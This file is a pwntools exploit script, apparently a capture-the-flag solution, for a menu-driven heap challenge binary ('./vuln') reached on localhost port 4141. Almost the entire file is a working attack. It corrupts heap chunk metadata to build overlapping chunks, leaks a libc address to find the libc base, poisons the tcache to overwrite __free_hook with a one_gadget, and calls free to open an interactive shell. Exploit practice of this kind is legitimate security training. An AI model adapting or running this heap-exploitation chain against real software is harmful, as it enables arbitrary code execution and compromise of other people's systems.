#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=127.0.0.1'
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './vuln'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4141)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def xor(string, byte):
    _temp = b''
    for i in string:
        _temp += bytes([i ^ byte])
    return _temp


def create(index, size, enc, content):
    io.recvuntil('#> ')
    io.sendline('1')
    io.recvuntil(':\n')
    io.sendline(index)
    io.recvuntil(':\n')
    io.sendline(size)
    io.recvuntil(':\n')
    io.sendline(chr(enc))
    io.recvuntil(':\n')
    _temp = xor(content, enc)
    io.sendline(_temp)

def read(index, enc):
    io.recvuntil('#> ')
    io.sendline('2')
    io.recvuntil(':\n')
    io.sendline(index)
    io.recvuntil(':\n')
    io.sendline(chr(enc))
    io.recvuntil(':\n')

    data = io.recvuntil(b'|======MENU======|').replace(b'|======MENU======|', b'')

    data = xor(data, enc)

    return data

def update(index, enc, content):
    io.recvuntil('#> ')
    io.sendline('3')
    io.recvuntil(':\n')
    io.sendline(index)
    io.recvuntil(':\n')
    io.sendline(chr(enc))
    io.recvuntil(':\n')
    _temp = xor(content, enc)

    io.sendline(_temp)

def delete(index):
    io.recvuntil('#> ')
    io.sendline('4')
    io.recvuntil(':\n')
    io.sendline(index)

libc = ELF('./libc.so.6')

io = start()

create(b'0',b'1160', 0x45, b'A'*1159)
create(b'1',b'1144', 0x45, b'B'*1143)
create(b'2',b'1144', 0x45, b'C'*1143)

delete(b'0')

create(b'3',b'1500', 0x45, b'F'*127)

update(b'1', 0x4, b'D'*1136 + p64(0x910) + b'\x80')

delete(b'2')

create(b'0',b'1160', 0x45, b'A'*1159)

leak = u64(read(b'1', 0x45)[:-1].ljust(8, b'\x00'))
libc_base = leak - 0x3ebca0
free_hook = libc_base + 0x3ed8e8

log.success(f'LEAK: {hex(leak)}')
log.success(f'LIBC BASE: {hex(libc_base)}')
log.success(f'FREE_HOOK: {hex(free_hook)}')


create(b'4', b'128', 0x45, b'A'*127)

create(b'5', b'128', 0x45, b'A'*127)
delete(b'5')
delete(b'4')

update(b'1', 0x7f, p64(free_hook)[:-3])

create(b'6', b'128', 0, b'SASISASI')
create(b'7', b'128', 0, p64(0x4f432 + libc_base))

delete(b'0')

io.interactive()

